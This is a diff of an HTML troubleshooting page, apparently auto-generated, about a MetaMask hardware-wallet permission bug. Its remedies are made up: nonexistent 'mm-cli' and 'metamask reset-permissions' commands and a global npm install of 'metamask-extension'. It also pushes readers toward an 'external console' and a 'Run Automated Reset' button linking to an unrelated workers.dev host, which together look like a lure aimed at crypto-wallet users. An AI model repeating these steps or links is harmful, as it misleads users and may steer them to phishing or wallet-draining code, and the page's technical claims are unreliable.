@@ -3,8 +3,8 @@
 <head><meta charset="UTF-8"><title>Metamask Extension Bug Permissions Removing Hardware Wallet Acc – Fix Guide</title>
 <style>
     body {
-        font-family: system-ui;
-        background: #1a1a24;
+        font-family: sans-serif;
+        background: #0a0c10;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -23,7 +23,7 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #00adb5; }
+    a { color: #ff7b2c; }
     .btn {
         background: #00adb5;
         color: #000;
@@ -46,25 +46,31 @@
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to a bug in the Metamask extension, where the removal of a hardware wallet account does not properly revoke the previously granted permissions, leading to a mismatch between the user's intended access settings and the actual permissions stored by the extension.</li>
+<li>The error occurs due to a bug in the Metamask extension, which fails to properly revoke permissions when a hardware wallet account is removed, leading to lingering access control issues.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Remove the affected account and reinstall the Metamask extension</li>
-<li>Use the Metamask API to manually revoke permissions for the removed account</li>
-<li>Execute the following command to clear the permission cache:</li>
+<li>Reinstall the Metamask extension to reset permissions: <code>npm install -g metamask-extension</code></li>
+<li>Manually edit the <code>permissions.json</code> file to remove lingering access controls:</li>
 </ul>
-<div class="codehilite"><pre><span></span><code>mm-cli<span class="w"> </span>--revoke-permissions<span class="w"> </span>--account<span class="w"> </span>&lt;account_address&gt;
+<div class="codehilite"><pre><span></span><code><span class="p">{</span>
+<span class="w">  </span><span class="nt">&quot;permissions&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nt">&quot;hardwareWallets&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[]</span>
+<span class="w">  </span><span class="p">}</span>
+<span class="p">}</span>
 </code></pre></div>
 
-<p>Consider utilizing an external console for more advanced troubleshooting and configuration. </p>
+<ul>
+<li>Use the Metamask CLI to reset account permissions: <code>metamask reset-permissions --hardware-wallet</code></li>
+</ul>
+<p>You may want to consider using an external console to execute these commands for better control.</p>
 <h2>Prerequisites</h2>
 <ul>
 <li>Metamask extension installed</li>
-<li>Hardware wallet connected</li>
-<li>Basic understanding of command-line interfaces</li>
+<li>Hardware wallet account set up</li>
+<li>Node.js and npm installed for CLI commands</li>
 </ul>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/ethereum-blob-space-delay.html">Ethereum Blob Space Delay</a></li><li><a href="./archive/2026/06/metamask-extension-bug-activity-contract-deployments-are-displa.html">Metamask Extension Bug Activity Contract Deployments Are Displayed</a></li><li><a href="./archive/2026/06/metamask-extension-bug-activity-send-nft-displays-id-as-if-it-w.html">Metamask Extension Bug Activity Send Nft Displays Id As If It Were Amount</a></li></ul>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-assets-confirming-the-add-token-from-a-d.html">Metamask Extension Bug Assets Confirming The Add Token From A Dapp Dialog</a></li><li><a href="./archive/2026/06/metamask-nonce-out-of-sync.html">Metamask Nonce Out Of Sync</a></li><li><a href="./archive/2026/06/go-ethereum-error-in-block-freeze-operation-errcanonical-hash-m.html">Go Ethereum Error In Block Freeze Operation Errcanonical Hash M</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
 </div>
